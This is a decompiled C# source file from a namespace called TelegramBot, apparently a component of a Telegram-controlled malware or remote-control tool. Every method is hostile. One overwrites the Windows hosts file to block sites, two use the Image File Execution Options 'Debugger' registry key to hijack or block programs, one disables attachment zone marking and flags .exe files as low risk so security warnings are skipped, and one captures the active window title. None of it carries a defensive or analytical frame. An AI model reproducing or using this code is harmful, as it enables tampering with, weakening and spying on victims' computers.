using System;
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace TelegramBot
{
	// Token: 0x020000F6 RID: 246
	internal static class RedirectAndBlock
	{
		// Token: 0x06000348 RID: 840 RVA: 0x00026530 File Offset: 0x00024730
		public static void block(string url)
		{
			string value = "127.0.0.1 " + url + "\n127.0.0.1 www." + url;
			StreamWriter streamWriter = new StreamWriter("C:\\Windows\\System32\\drivers\\etc\\hosts", false);
			streamWriter.Write(value);
			streamWriter.Close();
		}

		// Token: 0x06000349 RID: 841 RVA: 0x00026568 File Offset: 0x00024768
		public static void redirectkapp(string name, string second)
		{
			using (RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + name))
			{
				registryKey.SetValue("Debugger", second);
			}
		}

		// Token: 0x0600034A RID: 842 RVA: 0x000265B4 File Offset: 0x000247B4
		public static void StopChekingCertificate()
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations");
			RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments");
			registryKey2.SetValue("HideZoneInfoOnProperties", "1", RegistryValueKind.DWord);
			registryKey2.SetValue("SaveZoneInformation", "2", RegistryValueKind.DWord);
			registryKey.SetValue("DefaultFileTypeRisk", "6152", RegistryValueKind.DWord);
			registryKey.SetValue("LowRiskFileTypes", ".exe");
		}

		// Token: 0x0600034B RID: 843 RVA: 0x00026620 File Offset: 0x00024820
		public static string GetActiveWindowTitle()
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			if (DLLImport.GetWindowText(DLLImport.GetForegroundWindow(), stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
			return null;
		}

		// Token: 0x0600034C RID: 844 RVA: 0x00026654 File Offset: 0x00024854
		public static void blockapp(string name)
		{
			using (RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + name))
			{
				registryKey.SetValue("Debugger", "fghdshdzfhgsdfh.exe");
			}
		}

		// Token: 0x0600034D RID: 845 RVA: 0x000266A4 File Offset: 0x000248A4
		public static void unblockapp(string name)
		{
			using (RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"))
			{
				registryKey.DeleteSubKey(name);
			}
		}
	}
}
